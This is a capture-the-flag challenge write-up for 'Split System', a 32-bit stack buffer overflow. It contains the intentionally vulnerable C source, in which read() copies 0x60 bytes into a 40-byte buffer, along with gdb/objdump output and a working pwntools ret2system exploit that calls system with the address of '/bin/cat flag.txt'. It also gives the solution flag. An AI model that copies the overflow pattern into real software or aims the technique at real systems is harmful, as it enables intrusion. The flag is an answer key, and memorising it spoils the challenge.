# Split System

Difficulty Level: Medium
 
I have separated System and "/bin/cat flag.txt". Put them back together!
 
Connect via `nc challenge.ctf-fun.xyz 14013`

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- call system with the address of "/bin/cat flag.txt"


## Deployment

```bash
cd service
sudo ./splitsystem.sh &
```

## Solution
Open the source code and you will see a global variable helper with contents “/bin/cat flag.txt”
Use `objdump -t splitsystem` or `info variables` on `gdb` to find the address of helper (0x0804c060)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char helper[40] = "/bin/cat flag.txt";

void usefulFunction() {
	system("/bin/ls");
}

void vuln(){
	char buffer[40] = {0x00};

	printf("%s\n", "I heard you like system so I give it to you");
	printf("%s", "> ");

	read(0, buffer, 0x60);

	printf("%s\n", "Tanks.");
}

int main(int argc, char **argv) {
	setvbuf(stdin,NULL,2,0);
	setvbuf(stdout,NULL,2,0);
	setvbuf(stderr,NULL,2,0);

	vuln();
}
```

```bash
$ objdump -t splitsystem | grep helper
0804c060 g     O .data  00000028              helper
```

Afterwards use `gdb` to disassemble usefulFunction and get the address of `system@plt` (0x8049060)
 
```bash
gef➤  disassemble usefulFunction 
Dump of assembler code for function usefulFunction:
   0x080491a2 <+0>:     push   ebp
   0x080491a3 <+1>:     mov    ebp,esp
   0x080491a5 <+3>:     push   ebx
   0x080491a6 <+4>:     sub    esp,0x4
   0x080491a9 <+7>:     call   0x80492ee <__x86.get_pc_thunk.ax>
   0x080491ae <+12>:    add    eax,0x2e52
   0x080491b3 <+17>:    sub    esp,0xc
   0x080491b6 <+20>:    lea    edx,[eax-0x1ff8]
   0x080491bc <+26>:    push   edx
   0x080491bd <+27>:    mov    ebx,eax
   0x080491bf <+29>:    call   0x8049060 <system@plt>
   0x080491c4 <+34>:    add    esp,0x10
   0x080491c7 <+37>:    nop
   0x080491c8 <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080491cb <+41>:    leave  
   0x080491cc <+42>:    ret    
End of assembler dump.
gef➤  
```

Now call system(helper)

```python
"""
objdump to find out location of helper

"""


from pwn import *

def main():
	helper = p32(0x0804c060)
	system_loc = p32(0x8049060)

	padding = b'A' * 52

	fake_ret = b'BBBB'

	payload = padding + system_loc + fake_ret + helper

	#io = process('./splitsystem')
	io = remote("challenge.ctf-fun.xyz", 14013)
	io.sendline(payload)
	io.interactive()

if __name__ == '__main__':
	main()
```
### Flag
19C4{s3par4ted_but_insep4rable}